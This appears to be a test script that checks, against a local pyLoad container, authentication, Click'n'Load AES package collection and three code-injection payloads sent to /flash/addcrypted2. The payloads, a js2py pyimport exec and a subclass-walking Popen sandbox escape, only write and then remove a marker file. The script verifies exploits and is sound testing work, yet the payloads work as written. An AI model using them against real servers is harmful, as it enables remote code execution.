"""Verify real pyLoad authentication, AES collection and both injection primitives."""
from pathlib import Path
import base64
import hashlib
import http.cookiejar
import json
import os
import shlex
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

runtime = json.loads(Path(sys.argv[1]).read_text())
phase, version = sys.argv[2:4]
assert phase in ['before', 'after']
directory = Path(__file__).resolve().parent
catalog = json.loads((directory / 'releases.json').read_text())
release = catalog['versions'][version]
out = Path(runtime['artifacts']) / ('native-pyload-' + phase)
out.mkdir()
proof = {'phase': phase, 'version': version, 'commands': [], 'http': [], 'injections': []}
nonce = '{}-{}-{}'.format(phase, os.getpid(), time.time_ns())


def command(label, args, data=None, expected=0):
    process = subprocess.run(args, input=data, capture_output=True, timeout=45)
    proof['commands'].append({'label': label, 'argv': args, 'exit': process.returncode,
                              'stdout_base64': base64.b64encode(process.stdout).decode(),
                              'stderr_base64': base64.b64encode(process.stderr).decode()})
    if expected is not None:
        assert process.returncode == expected, (label, process.stderr.decode(errors='replace'))
    return process


def cli(label, *args, expected=0):
    return command(label, runtime['compose'] + ['exec', '-T', 'app'] + list(args), expected=expected).stdout


def snapshot(label):
    raw = cli(label, 'python3', '-c', (directory / 'snapshot.py').read_text())
    rows = [json.loads(line[len('NATIVE_JSON='):]) for line in raw.decode().splitlines() if line.startswith('NATIVE_JSON=')]
    assert len(rows) == 1
    return rows[0]


def request(label, port, path, data=None, headers=None, client=None, expected=200):
    query = urllib.request.Request(base[port] + path, data=data, headers={'Host': 'pyload-target.invalid', **(headers or {})})
    try:
        response = client.open(query, timeout=20) if client else urllib.request.urlopen(query, timeout=20)
    except urllib.error.HTTPError as error:
        response = error
    raw = response.read()
    (out / (str(len(proof['http'])) + '-' + label + '.body')).write_bytes(raw)
    proof['http'].append({'label': label, 'method': query.get_method(), 'url': query.full_url,
                          'headers_sent': dict(query.header_items()), 'status': response.status,
                          'data_base64': base64.b64encode(data).decode() if data is not None else None,
                          'headers': list(response.headers.items()), 'body_sha256': hashlib.sha256(raw).hexdigest()})
    assert response.status == expected, (label, response.status, raw[:400])
    return raw


def form(values):
    return urllib.parse.urlencode(values).encode()


def file_state(label, path):
    code = "import base64,json,sys;from pathlib import Path;p=Path(sys.argv[1]);print(json.dumps({'exists':p.is_file(),'uid':p.stat().st_uid if p.is_file()else None,'base64':base64.b64encode(p.read_bytes()).decode()if p.is_file()else None}))"
    return json.loads(cli(label, 'python3', '-c', code, path))


def settled(label, condition):
    deadline = time.monotonic() + 15
    attempt = 0
    while time.monotonic() < deadline:
        state = snapshot(label + '-' + str(attempt))
        if condition(state):
            return state
        attempt += 1
        time.sleep(.2)
    raise RuntimeError('Native state did not settle: ' + label)


def injection(label, primitive, port):
    path = '/tmp/module-target-pyload-native-' + nonce + '-' + label
    assert file_state(label + '-absent', path)['exists'] is False
    content = nonce + '-' + label
    python = 'from pathlib import Path;Path(' + repr(path) + ').write_text(' + repr(content) + ')'
    if primitive == 'classic':
        javascript = 'pyimport builtins;pyimport base64;builtins.exec(base64.b64decode("' + base64.b64encode(python.encode()).decode() + '"));function f(){};'
    else:
        # Canonical upstream PoC, independently of Framework's obfuscator.
        shell = 'python3 -c ' + shlex.quote(python)
        if port == 8000:
            shell += '\ntrue'
        javascript = 'var cmd=' + json.dumps(shell) + ";var hacked,bymarve,n11,getattr,obj;hacked=Object.getOwnPropertyNames({});bymarve=hacked.__getattribute__;n11=bymarve('__getattribute__');obj=n11('__class__').__base__;getattr=obj.__getattribute__;function findpopen(o){var result;for(var i in o.__subclasses__()){var item=o.__subclasses__()[i];if(item.__module__=='subprocess'&&item.__name__=='Popen'){return item;}if(item.__name__!='type'&&(result=findpopen(item))){return result;}}}n11=findpopen(obj)(cmd,-1,null,-1,-1,-1,null,null,true).communicate();function f(){return n11;}"
    try:
        request(label, port, '/flash/addcrypted2', form({'crypted': base64.b64encode(b'1234').decode(), 'jk': javascript}),
                headers={'Host': '127.0.0.1:9666'} if port == 8000 else None, expected=500)
        observed = file_state(label + '-proof', path)
        expected = {'exists': True, 'uid': catalog['uid'], 'base64': base64.b64encode(content.encode()).decode()} if release[primitive] else {'exists': False, 'uid': None, 'base64': None}
        proof['injections'].append({'label': label, 'primitive': primitive, 'port': port, 'expected': expected, 'observed': observed})
        assert observed == expected
    finally:
        cli(label + '-remove', 'rm', '-f', path)
        assert file_state(label + '-removed', path)['exists'] is False


try:
    base = {}
    for port in [8000, 9666]:
        binding = command('port-' + str(port), runtime['compose'] + ['port', 'app', str(port)]).stdout.decode().strip()
        assert binding.startswith('127.0.0.1:')
        base[port] = 'http://' + binding
    proof['endpoints'] = {name: {'host': '127.0.0.1', 'port': int(base[port].rsplit(':', 1)[1])} for name, port in [('cnl', 9666), ('web', 8000)]}
    before = snapshot('before')
    proof['before'] = before
    assert before['package'] == version and before['sources'] == release['sources']
    assert len(before['processes']) == 1 and before['processes'][0]['uid'] == catalog['uid']
    assert before['tables']['packages'] == before['tables']['links'] == []
    assert len(before['tables']['users']) == 1 and before['tables']['users'][0]['name'] == 'pyload'
    page = request('login-page', 8000, '/login')
    assert b'username' in page and b'password' in page
    request('anonymous-api', 8000, '/api/get_server_version', expected=401)
    client = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    user = json.loads(request('valid-login', 8000, '/api/login', form({'username': 'pyload', 'password': 'pyload'}), client=client))
    assert user['name'] == 'pyload' and user['role'] == 0
    assert json.loads(request('wrong-login', 8000, '/api/login', form({'username': 'pyload', 'password': 'Module-invalid-password42!'}))) is False
    assert json.loads(request('authenticated-api', 8000, '/api/get_server_version', client=client)) == '0.5.0'
    request('primary-external-host', 8000, '/flash/', expected=403)
    assert b'JDownloader' in request('primary-allowed-host', 8000, '/flash/', headers={'Host': '127.0.0.1:9666'})
    assert b'JDownloader' in request('native-cnl-proxy', 9666, '/flash/')
    request('primary-forwarded-port-host', 8000, '/flash/', headers={'Host': '127.0.0.1:' + str(proof['endpoints']['web']['port'])}, expected=403)
    assert request('ordinary-resource', 8000, '/favicon.ico')
    url = 'http://127.0.0.1:8000/favicon.ico'
    code = "import base64,json,sys;from cryptography.hazmat.backends import default_backend;from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes;k=bytes.fromhex('00112233445566778899aabbccddeeff');p=(sys.argv[1]+'\\n').encode();p+=b'\\0'*((-len(p))%16);e=Cipher(algorithms.AES(k),modes.CBC(k),backend=default_backend()).encryptor();print(json.dumps({'key':k.hex(),'crypted':base64.b64encode(e.update(p)+e.finalize()).decode()}))"
    encrypted = json.loads(cli('native-aes', 'python3', '-c', code, url))
    for index in range(2):
        name = 'module-target-pyload-' + nonce + '-' + str(index)
        body = request('ordinary-collection-' + str(index), 9666, '/flash/addcrypted2', form({'package': name, 'crypted': encrypted['crypted'], 'jk': "function f(){return '" + encrypted['key'] + "';}"}))
        assert body.strip() == b'success'
        state = settled('stored', lambda value: len(value['tables']['packages']) == len(value['tables']['links']) == 1)
        package, link = state['tables']['packages'][0], state['tables']['links'][0]
        assert package['name'] == name and package['queue'] == 0 and link['url'] == url and link['package'] == package['id']
        request('delete-owned-package', 8000, '/api/delete_packages', form({'package_ids': repr([package['id']])}), client=client)
        settled('deleted', lambda value: value['tables']['packages'] == value['tables']['links'] == [])
    injection('pyimport', 'classic', 9666)
    injection('sandbox-cnl', 'sandbox', 9666)
    injection('sandbox-web', 'sandbox', 8000)
    if phase == 'before':
        proof['architectures'] = {}
        for arch in [64, 32]:
            compiled = out / ('exit-' + str(arch))
            source = directory.parent / 'druid_sessions/native_exit.asm'
            command('assemble-' + str(arch), ['nasm', '-f', 'bin', '-DARCH=' + str(arch), str(source), '-o', str(compiled)])
            data = compiled.read_bytes()
            assert data[:5] == b'\x7fELF' + bytes([2 if arch == 64 else 1])
            path = '/tmp/module-target-pyload-native-exit-' + str(arch)
            assert file_state('elf-before', path)['exists'] is False
            try:
                command('copy-elf', runtime['compose'] + ['cp', str(compiled), 'app:' + path])
                cli('executable', 'chmod', '755', path)
                actual = cli('elf-sha', 'sha256sum', path).decode().split()[0]
                assert actual == hashlib.sha256(data).hexdigest()
                execution = command('execute-elf-' + str(arch), runtime['compose'] + ['exec', '-T', 'app', 's6-setuidgid', 'abc', path], expected=None)
                proof['architectures'][str(arch)] = {'exit': execution.returncode, 'supported': execution.returncode == 42, 'sha256': actual,
                                                    'source_sha256': hashlib.sha256(source.read_bytes()).hexdigest()}
            finally:
                cli('remove-elf', 'rm', '-f', path)
                assert file_state('elf-removed', path)['exists'] is False
        assert proof['architectures']['64']['supported']
    after = snapshot('after')
    assert after == before
    proof['snapshot'] = after
    proof['status'] = 'passed'
except BaseException as error:
    proof['status'] = 'failed'
    proof['error'] = {'type': type(error).__name__, 'message': str(error)}
    raise
finally:
    (Path(runtime['artifacts']) / ('native-pyload-' + phase + '.json')).write_text(json.dumps(proof, indent=2) + '\n')
print('Native pyLoad controls passed: ' + phase + ' ' + version)
